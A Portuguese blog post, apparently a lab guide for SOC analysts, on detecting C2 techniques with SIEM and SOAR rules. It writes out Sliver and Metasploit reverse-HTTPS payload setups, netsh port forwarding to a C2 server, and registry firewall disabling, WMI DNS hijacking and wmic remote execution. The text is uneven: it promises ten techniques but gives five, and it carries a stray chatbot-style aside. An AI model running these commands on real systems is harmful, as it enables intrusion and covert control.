---
title: "Detectando técnicas de C2: Guia prático para Analistas de SOC"
url: "/blog/detectando-tecnicas-de-c2"
date: 2026-01-08T16:07:00-03:00
draft: false
description: "Um guia prático para identificar técnicas de C2, com simulações reais."
noindex: false
featured: false
pinned: false
comments: false
series:
 - 
categories:
 - Windows
 - Segurança e Defesa
 - Ataques e Exploração
 - Resposta a Incidentes
 - Threat Detection
 - Threat Hunting
tags:
 - Resposta a Incidentes
 - Análise de Logs
 - Registros
 - Threat Hunting
 - Detecção de Ameaças
 - Exploração
 - Logs do Windows
 - Scripts
 - PowerShell
 - CyberSecurity
 - Threat Detection
 - C2Detection
 - SIEM
 - SOAR
authors:
 - sandson
#images:
---
# TL;DR

Este guia apresenta **10 técnicas avançadas de Command & Control (C2)** utilizadas por atacantes modernos, incluindo métodos com `netsh` (ainda amplamente usado), Sliver C2, pivoting com domínios, DNS tunneling e WireGuard.

Cada técnica inclui:
- Simulação prática em ambiente controlado
- Regras SIEM prontas para implementação imediata
- Indicadores de comprometimento (IoCs) específicos
- Correlações inteligentes para reduzir falsos positivos

Você aprenderá a detectar desde técnicas legadas (netsh port forwarding) até métodos evasivos modernos (DNS C2, in-memory execution, WireGuard tunneling).

O framework completo de simulação permite validar suas detecções antes de colocá-las em produção.

# 1. Introdução

É fato que constantemente atacantes evoluem suas técnicas de C2 pra se evadir de detecções baseadas em assinaturas. Regras simples como `SE netsh.exe + taskoffload + /usermode ENTÃO alerta` são facilmente burladas e são insuficientes porque:

- **Ofuscação de comandos:** PowerShell encriptado, Base64, variáveis
- **Living off the Land (LOLBins):** Ferramentas nativas do Windows (netsh, wmic, reg)
- **Protocolos legítimos:** HTTPS, DNS, WireGuard ocultam tráfego malicioso
- **Execução in-memory:** BOFs/COFFs evitam gravação em disco
- **Pivoting nativo:** Frameworks como Sliver eliminam dependência de ferramentas legadas

O resultado? **Blind spots** na detecção.

Este guia foca em **correlações contextuais** e **análise comportamental** para detectar atividades maliciosas independentemente da ferramenta utilizada.

# 2. Montando nosso laboratório

Utilizaremos **Sliver C2**, que suporta mTLS, HTTP/S, DNS, WireGuard e pivots nativos.

## 2.1. Preparação

- **Sliver Server**: Instale no Kali/Ubuntu com `go install github.com/bishopfox/sliver@latest`.
- **Geração de Implants**: Use `--mtls`, `--http`, `--dns` com domínios.
- **Domínios**: Configure um domínio como pivot.sandsoncosta.com apontando para seu C2.
- **Listeners**: Inicie com `mtls`, `https --domain pivot.sandsoncosta.com`, `dns --domains pivot.sandsoncosta.com`.

No meu lab, o dns e domínio estão configurados localmente.

## 2.2. Técnica 1: Pivoting nativo com domínio

<kbd>**MITRE ATT&CK:** T1090.001 (Internal Proxy) + T1572 (Protocol Tunneling)</kbd>

### O que é?

Atacantes comprometem uma máquina Windows e a usam como pivot para acessar redes internas, escondendo o C2 real. Em 2026, pivots nativos do Sliver (TCP/Named Pipe) substituem netsh para maior stealth, suportando FQDNs como pivot.sandsoncosta.com.

### Como funciona o fluxo do ataque?

```
[C2 Real] ← [Windows Pivot:8080] ← [Payload na máquina]
```

O payload conecta em `localhost:8080`, que é **redirecionado** para o C2 real.

### Por que é perigoso?

- Permite moviemntação lateral sem credenciais.
- Bypassa regras de firewall baseadas em IP de destino.
- Difícil de detectar sem correlação temporal.

### Como simular?

No Sliver C2, vamos preparar nosso _implant_. Criaremos um implant `tls` e um `http`.

```bash
[server] sliver > generate --mtls 127.0.0.1:8080 --os windows --arch amd64 --save /tmp/pivot_implant.exe --skip-symbols

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 2s
[*] Implant saved to /tmp/pivot_implant.exe

[server] sliver > generate --http 127.0.0.1:8080 --os windows --arch amd64 --save /tmp/pivot_implant_http.exe --skip-symbols

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /tmp/pivot_implant_http.exe

[server] sliver >
```

### Comparação Rápida

| Característica              | --mtls (Mutual TLS)                  | --http (HTTP/S)                          |
|-----------------------------|------------------------------------------|----------------------------------------------|
| **Tipo de conexão**         | TCP + TLS mútuo                          | HTTP ou HTTPS (com crypto própria do Sliver) |
| **Autenticação**            | Mútua (certificados nos dois lados)      | Só o servidor (implant confia no domínio)    |
| **Stealth / Evasão**        | Baixa (fingerprint forte)                | Alta (parece tráfego web)                    |
| **Performance**             | Alta (conexão persistente)               | Média-baixa (polling ou long-polling)        |
| **Ideal para**              | Sessions interativas, pivoting interno   | Beacons em redes restritas, OPSEC alta       |
| **Portas comuns**           | Qualquer (geralmente 443, 8888, etc.)    | 80/443 (padrão web)                          |
| **Recomendado pela doc**    | Sim, sempre que possível                 | Quando mTLS/WireGuard não passam             |

### Resumo prático pra você usar

- **Use --mtls** quando:
  - Você está testando em lab ou rede interna
  - Quer **sessions rápidas e estáveis**
  - Não tem preocupação alta com detecção

- **Use --http** quando:
  - Está em ambiente **realista** com proxy/firewall
  - Quer **beacons** que chamem de volta sem chamar atenção
  - Precisa de **maior chance de passar** em egress filtering

- **Dica top**  
  Você pode gerar um implant **híbrido** com os dois protocolos!  
  Exemplo:
  ```bash
  generate --mtls 192.168.1.100:8888 --http pivot.example.com:443 --os windows --arch amd64 --save /tmp/implant_hibrido.exe
  ```
  O implant vai tentar primeiro **mTLS** (mais rápido/seguro), se falhar cai pro **HTTP(S)**.

Qualquer dúvida sobre como configurar o listener pros dois, como combinar com beacons/sessions ou como fazer pivoting com isso, é só mandar! 🚀

No nosso server, vamos configurar o pivoting:

```powershell
# Máquina comprometida redireciona tráfego
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=<C2_SERVER>
```


## Regra SIEM:

```yaml
rule: netsh_port_forwarding_lateral_movement
events:
  - event_id: 4688
    process: netsh.exe
    cmdline_contains: ["portproxy", "add", "v4tov4"]
  
correlation:
  - within: 120 seconds
    events:
      - sysmon_event_id: 3
        initiated: true
        source_port: <porta configurada>

severity: HIGH → CRITICAL (se conexão ativa)
```

---

# 🎯 Técnica 2: PowerShell Firewall Manipulation

**MITRE ATT&CK:** T1562.004 (Disable/Modify Firewall)

## O que é?

Em vez de usar `netsh advfirewall` (muito detectado), atacantes usam **cmdlets PowerShell nativos**:

```powershell
New-NetFirewallRule -DisplayName "Windows Update" 
    -Direction Outbound 
    -Action Allow 
    -Program "C:\malware.exe"
```

## Por que é furtivo?

- PowerShell é usado legitimamente por admins
- Cmdlets nativos não acionam alertas tradicionais
- Pode ser facilmente ofuscado

## Como simular?

```powershell
.\Complete-Attack-Simulation.ps1 
    -Technique PowerShellFirewall 
    -AttackerIP 192.168.1.100 
    -PayloadURL "http://192.168.1.100:8000/update.exe"
```

## O que observar no SIEM:

1. **EventID 4104** (Script Block Logging) com `New-NetFirewallRule`
2. **EventID 2004** (Firewall Rule Added) imediatamente após
3. **Processo criado** (payload) usando a regra
4. **Conexão outbound** em < 60 segundos

## Regra SIEM:

```yaml
rule: powershell_firewall_c2_allowance
events:
  - event_id: 4104
    script_block_contains:
      - "New-NetFirewallRule"
      - "-Action Allow"
      - "-Direction Outbound"

correlation:
  - within: 60 seconds
    events:
      - event_id: 2004  # Firewall rule added
      - event_id: 4688  # Process from rule
      - sysmon_3        # Network connection

severity: HIGH → CRITICAL (se payload + C2)
```

---

# 🎯 Técnica 3: WMI DNS Hijacking

**MITRE ATT&CK:** T1557.002 + T1071.004 (DNS C2)

## O que é?

Atacantes modificam o servidor DNS da vítima via **WMI** para:
- Redirecionar todo tráfego para servidor malicioso
- Realizar **DNS tunneling** (C2 via queries DNS)
- Interceptar credenciais (DNS spoofing)

## Como funciona?

```powershell
# Obter adaptador de rede via WMI
$nic = Get-WmiObject Win32_NetworkAdapterConfiguration 
    -Filter "IPEnabled=True"

# Modificar DNS para servidor do atacante
$nic.SetDNSServerSearchOrder(@("192.168.1.100", "8.8.8.8"))
```

**Resultado:**
```
Vítima tenta: google.com
DNS malicioso responde: 192.168.1.100 (servidor do atacante)
Vítima conecta achando que é o Google legítimo
```

## Por que é devastador?

- Todo tráfego HTTP/HTTPS pode ser interceptado
- Permite phishing de credenciais
- DNS tunneling bypassa firewalls de aplicação
- Difícil de detectar sem monitoramento de DNS

## Como simular?

**No Kali:**
```bash
sudo apt install dnsmasq -y
sudo nano /etc/dnsmasq.conf
# Adicionar:
listen-address=192.168.1.100
address=/google.com/192.168.1.100
sudo systemctl restart dnsmasq
```

**No Windows:**
```powershell
.\Complete-Attack-Simulation.ps1 
    -Technique WMIDNS 
    -AttackerIP 192.168.1.100 
    -PayloadURL "http://192.168.1.100:8000/payload.exe"
```

## Eventos críticos:

1. **EventID 5858** (WMI Method: SetDNSServerSearchOrder)
2. **Sysmon EventID 22** (DNS Query) para IPs não esperados
3. **Alto volume** de queries DNS (se tunneling)
4. **Queries TXT/NULL** (típico de tunneling)

## Regra SIEM:

```yaml
rule: wmi_dns_hijacking_c2
events:
  - event_id: 5858
    method: "SetDNSServerSearchOrder"
    parameters_not_in: [approved_dns_list]

correlation:
  - within: 300 seconds
    events:
      - sysmon_22: volume > 100 queries
      - sysmon_22: query_type IN [TXT, NULL]
      - sysmon_3: dest_port 53, dest_ip NOT corporate

severity: CRITICAL
response: isolate_host + capture_traffic
```

---

# 🎯 Técnica 4: Registry Firewall Bypass

**MITRE ATT&CK:** T1112 + T1562.004

## O que é?

A forma **mais furtiva** de desabilitar o firewall: modificar diretamente o **registro do Windows**.

```powershell
# Desabilitar firewall para todos os perfis
Set-ItemProperty 
    -Path "HKLM:\...\FirewallPolicy\StandardProfile" 
    -Name "EnableFirewall" 
    -Value 0
```

## Por que é extremamente perigoso?

- **Não executa netsh** (bypass de regras tradicionais)
- **Não usa PowerShell cmdlets conhecidos** (bypass de Script Block Logging)
- **Persistente** (sobrevive a reinicializações)
- Pode desabilitar Windows Defender, UAC, etc do mesmo modo

## Como simular?

```powershell
.\Complete-Attack-Simulation.ps1 
    -Technique RegistryBypass 
    -AttackerIP 192.168.1.100 
    -PayloadURL "http://192.168.1.100:8000/payload.exe"
```

## Eventos críticos:

1. **Sysmon EventID 13** (Registry Value Set) - `EnableFirewall=0`
2. **EventID 7040** (Service State Change) - mpssvc stopped/disabled
3. **Execução de payload** sem bloqueios
4. **Conexão C2** imediata

## Regra SIEM:

```yaml
rule: registry_firewall_complete_bypass
events:
  - sysmon_event_id: 13
    target_object_contains: "FirewallPolicy"
    target_object_contains: "EnableFirewall"
    details: "DWORD (0x00000000)"

correlation:
  - within: 120 seconds
    events:
      - event_7040: service mpssvc
      - sysmon_1: suspicious_path
      - sysmon_3: outbound_connection

severity: CRITICAL
response: immediate_isolation + forensics
```

---

# 🎯 Técnica 5: WMIC DNS Manipulation (Legacy)

**MITRE ATT&CK:** T1047 + T1071.004

## O que é?

**WMIC** (Windows Management Instrumentation Command-line) está **depreciado** desde Windows 10 21H1, mas:
- Ainda funciona em sistemas legados
- Muito usado em malware antigo ainda ativo
- Permite execução remota de processos

```powershell
# Modificar DNS via WMIC
wmic nicconfig where "IPEnabled=True" 
    call SetDNSServerSearchOrder ("192.168.1.100","8.8.8.8")

# Executar processo remotamente
wmic /node:"TARGET" process call create "C:\malware.exe"
```

## Por que ainda é relevante?

- Muitas organizações têm Windows Server 2016/2019 (ainda suportam WMIC)
- Ferramentas de pentest antigas (Metasploit modules) ainda usam
- Lateral movement via `wmic /node`

## Como simular?

```powershell
.\Complete-Attack-Simulation.ps1 
    -Technique WMICDNS 
    -AttackerIP 192.168.1.100 
    -PayloadURL "http://192.168.1.100:8000/payload.exe"
```

## Regra SIEM:

```yaml
rule: wmic_dns_or_remote_execution
events:
  - event_id: 4688
    process: wmic.exe
    cmdline_contains_any:
      - "SetDNSServerSearchOrder"
      - "process call create"
      - "/node:"

severity: HIGH → CRITICAL (se remote exec)
threat_hunting: check lateral movement
```

---

# 3. Framework de Simulação Completo

# 3.1 Preparação do Ambiente

**Requisitos:**
- VM Windows (10/11 ou Server 2019/2022)
- Kali Linux com Metasploit ou Sliver
- Rede isolada (VLAN de testes)
- SIEM configurado (Splunk, Elastic, etc)
- Sysmon instalado na VM Windows

# 3.2 Setup do Kali (Servidor C2)

```bash
# Opção 1: Metasploit
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
generate -f exe -o /tmp/payload.exe
exploit -j

# Servir payload via HTTP
python3 -m http.server 8000

# Opção 2: Sliver (mais moderno)
sliver-server
generate --mtls 192.168.1.100:443 --os windows --arch amd64 --save /tmp/payload.exe
mtls --lhost 192.168.1.100 --lport 443
```

# 3.3 Configuração do SIEM

**Ingestão de logs necessária:**
- Windows Security Event Logs
- Sysmon Event Logs
- PowerShell Operational Logs
- WMI Activity Logs

**Configurar forwarding:**
```powershell
# Winlogbeat, NXLog, ou Windows Event Forwarding
winlogbeat.yml:
  event_logs:
    - name: Security
    - name: Microsoft-Windows-Sysmon/Operational
    - name: Microsoft-Windows-PowerShell/Operational
    - name: Microsoft-Windows-WMI-Activity/Operational
```

# 3.4 Executando Simulações

```powershell
# Download do script completo
Invoke-WebRequest -Uri "https://gist.github.com/[seu-link]" 
    -OutFile "Complete-Attack-Simulation.ps1"

# Executar todas as técnicas sequencialmente
.\Complete-Attack-Simulation.ps1 
    -Technique AllTechniques 
    -AttackerIP 192.168.1.100 
    -PayloadURL "http://192.168.1.100:8000/payload.exe" 
    -CleanupAfter

# Ou testar individualmente
.\Complete-Attack-Simulation.ps1 -Technique PortForwarding ...
.\Complete-Attack-Simulation.ps1 -Technique PowerShellFirewall ...
.\Complete-Attack-Simulation.ps1 -Technique WMIDNS ...
```

# 3.5 Validação no SIEM

Para cada técnica, verifique:

1. **Alertas gerados** (tempo de detecção)
2. **Correlação temporal** (eventos relacionados agrupados?)
3. **Falsos positivos** (atividade legítima detectada?)
4. **Falsos negativos** (técnica não detectada?)

**Query de exemplo (Splunk):**
```spl
index=windows EventCode IN (4688, 1, 4104, 5858, 13) 
| transaction host maxspan=120s 
| search (
    (process_name="netsh.exe" AND CommandLine="*portproxy*") OR
    (EventCode=4104 AND ScriptBlockText="*New-NetFirewallRule*") OR
    (EventCode=5858 AND MethodName="SetDNSServerSearchOrder") OR
    (EventCode=13 AND TargetObject="*EnableFirewall*")
)
| stats count by Technique, host, user
```

---

# 4. Tuning de Regras: Reduzindo Falsos Positivos

# 4.1 Baseline de Comportamento Normal

**Antes de implementar regras em produção:**

1. **Período de observação** (2-4 semanas)
2. **Identificar padrões legítimos:**
   - Scripts de instalação de software
   - Ferramentas de gerenciamento de TI
   - Automação legítima (Ansible, SCCM, etc)

3. **Criar whitelists contextuais:**

```yaml
whitelist_port_forwarding:
  - user: "DOMAIN\NetworkAdmins"
    parent_process: "C:\IT Tools\Network Configurator\*"
    
whitelist_firewall_rules:
  - program_path: "C:\Program Files\Approved Software\*"
  - user: "DOMAIN\ITAdmins"
  - scheduled_task: "Software Deployment"

whitelist_dns_changes:
  - approved_dns: ["10.0.0.1", "10.0.0.2", "8.8.8.8", "1.1.1.1"]
  - authorized_users: ["DOMAIN\NetworkTeam"]
```

# 4.2 Correlação Inteligente

**Não alerte em eventos isolados. Correlacione:**

```python
# Pseudocódigo
def evaluate_threat(event):
    score = 0
    
    # Processo suspeito?
    if event.process_path in SUSPICIOUS_PATHS:
        score += 3
    
    # Usuário sem privilégios?
    if not event.user in ADMIN_GROUPS:
        score += 2
    
    # Horário anômalo?
    if event.timestamp.hour NOT IN BUSINESS_HOURS:
        score += 2
    
    # Conexão C2 conhecida?
    if event.destination_ip in THREAT_INTEL_IOCS:
        score += 5
    
    # Parent process suspeito?
    if event.parent_process in ["cmd.exe", "wscript.exe"]:
        score += 2
    
    # Scoring
    if score >= 7:
        return "CRITICAL"
    elif score >= 4:
        return "HIGH"
    else:
        return "MEDIUM"
```

# 4.3 Métricas de Sucesso

Após 1 mês de produção, avalie:

| Métrica | Objetivo | Realidade |
|---------|----------|-----------|
| Taxa de Detecção | > 95% | ___% |
| Tempo Médio de Detecção | < 60s | ___s |
| Falsos Positivos/Dia | < 5 | ___ |
| Falsos Negativos | 0 | ___ |
| Tempo de Resposta | < 5min | ___min |

---

# 5. Integração com SOAR

# 5.1 Playbook Automatizado

```yaml
playbook: "C2_Detection_and_Response"

trigger:
  rules:
    - "netsh_port_forwarding"
    - "powershell_firewall_manipulation"
    - "wmi_dns_hijacking"
    - "registry_firewall_bypass"
    - "wmic_dns_manipulation"

enrichment:
  1. Query VirusTotal (file hash)
  2. Check IP reputation (GreyNoise, AbuseIPDB)
  3. Query threat intel feeds
  4. Get parent process tree
  5. Enumerate network connections

decision_tree:
  if threat_score >= 8:
    - action: isolate_host
    - action: capture_memory
    - action: notify_ir_team
    - action: create_jira_ticket
    
  elif threat_score >= 5:
    - action: notify_soc_l2
    - action: monitor_closely
    - action: add_to_watchlist
    
  else:
    - action: log_for_review
    - action: add_to_metrics
```

# 5.2 Resposta Automática

```python
# Exemplo de integração com EDR (CrowdStrike, SentinelOne, etc)
def respond_to_c2(alert):
    host = alert['host']
    process_id = alert['process_id']
    
    # 1. Contenção
    edr.isolate_host(host)
    edr.kill_process(host, process_id)
    
    # 2. Coleta de evidências
    memory_dump = edr.capture_memory(host)
    network_pcap = edr.capture_traffic(host, duration=60)
    
    # 3. Threat intel
    file_hash = alert['file_hash']
    vt_report = virustotal.query(file_hash)
    
    # 4. Notificação
    slack.send(
        channel="#soc-alerts",
        message=f"🚨 C2 Activity Detected on {host}",
        severity="CRITICAL",
        details=alert
    )
    
    # 5. Ticket
    jira.create_incident(
        summary=f"Active C2 - {host}",
        priority="P1",
        evidence=[memory_dump, network_pcap, vt_report]
    )
```

---

# 6. Conclusão e Próximos Passos

# 6.1 O Que Aprendemos

1. **Atacantes evoluem** - técnicas tradicionais de detecção não são suficientes
2. **Correlação temporal é crítica** - eventos isolados não contam a história completa
3. **Simulação é essencial** - valide suas regras antes de produção
4. **Tuning é contínuo** - adapte-se ao seu ambiente

# 6.2 Checklist de Implementação

- [ ] Configurar auditoria de processos (EventID 4688)
- [ ] Instalar Sysmon em endpoints críticos
- [ ] Habilitar PowerShell Script Block Logging
- [ ] Configurar WMI Activity Logging
- [ ] Implementar as 5 regras SIEM
- [ ] Executar simulações em ambiente de teste
- [ ] Baseline de comportamento normal (2-4 semanas)
- [ ] Tuning de whitelists
- [ ] Integração com SOAR
- [ ] Treinamento do time SOC
- [ ] Documentação de runbooks

# 6.3 Recursos Adicionais

**Scripts completos:**
- [GitHub - Complete-Attack-Simulation.ps1](#)
- [GitHub - SIEM Detection Rules](#)

**Referências:**
- MITRE ATT&CK Framework
- Sysmon Configuration (SwiftOnSecurity)
- Sigma Rules Repository

**Contato:**
- Twitter: [@seu_handle]
- LinkedIn: [seu_perfil]
- Blog: [seu_blog]

---

# 7. FAQ

**P: Essas técnicas funcionam em ambientes com EDR?**  
R: Sim, mas EDRs modernos podem detectar. O objetivo é ter **detecção em profundidade** (defense in depth).

**P: Posso usar esses scripts em produção?**  
R: **NÃO!** Use apenas em ambientes de laboratório controlados. Execução em produção viola políticas de segurança.

**P: Quais SIEMs suportam essas regras?**  
R: Splunk, Elastic, QRadar, Sentinel, Chronicle - qualquer SIEM com capacidade de correlação temporal.

**P: Como lidar com falsos positivos de ferramentas legítimas?**  
R: Crie whitelists contextuais baseadas em: usuário + caminho do processo + parent process + horário.

**P: DNS tunneling é muito comum?**  
R: Em ataques avançados (APT), sim. Em malware commodity, menos. Mas a detecção vale a pena.

---

*Este artigo foi desenvolvido com base em pesquisas reais, simulações em laboratório controlado e experiência prática em detecção de ameaças. Todas as técnicas devem ser testadas apenas em ambientes autorizados.*

---
{{< bs/alert warning >}}
{{< bs/alert-heading "Encontrou algum erro? Quer sugerir alguma mudança ou acrescentar algo?" >}}
Por favor, entre em contato comigo pelo meu <a href="https://www.linkedin.com/in/sandsoncosta">LinkedIn</a>.<br>Vou ficar muito contente em receber um feedback seu.
{{< /bs/alert >}}
